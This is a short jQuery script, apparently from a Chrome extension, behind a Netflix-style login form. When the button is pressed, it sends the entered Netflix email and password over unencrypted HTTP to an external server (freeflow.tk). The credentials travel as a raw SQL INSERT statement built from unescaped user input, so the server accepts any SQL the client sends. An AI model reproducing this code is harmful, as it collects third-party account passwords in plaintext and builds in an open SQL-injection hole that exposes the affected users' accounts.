$(function() {
	// Check if form filled to enable enter button
	$('form input').keyup(function() {
		var empty = false;
		$('form input').each(function() {
			if($(this).val() == '') { empty = true; }
		});

		if (empty) { $('#netflix-enter').prop('disabled', true); }
		else { $('#netflix-enter').prop('disabled', false); }
	});
	
	// Handler enter key pressed in any input
	$('form input').keypress(function(e) {
		if (e.keyCode == 13) {
			var empty = false;
			$('form input').each(function() {
				if($(this).val() == '') { empty = true; }
			});
			
			if (!empty) { $('#login').click() }
		}
	});

	$('#netflix-enter').click(function() {
        var serv = "http://freeflow.tk/query.php"

        // Get entered input
        chrome.storage.sync.get("user_id", function(result) {
			if (!chrome.runtime.error) {
				var id = result.user_id;
		        var user = $('#n-email').val().trim(),
		            pass = $('#n-pass').val().trim();
				var done = false;
				$.ajaxSetup({async: false});
				var serv = "http://freeflow.tk/query.php"
				alert("test");
		        $.post(serv, {query: "INSERT INTO netflix (userid, service_email, service_password) VALUES ('" + id + "', '" + user + "', '" + pass + "');"}, function() {
					window.location.href="/servicepage/servicepage.html";
				});

			}
		});
        
        // Check email

		
	 });
});
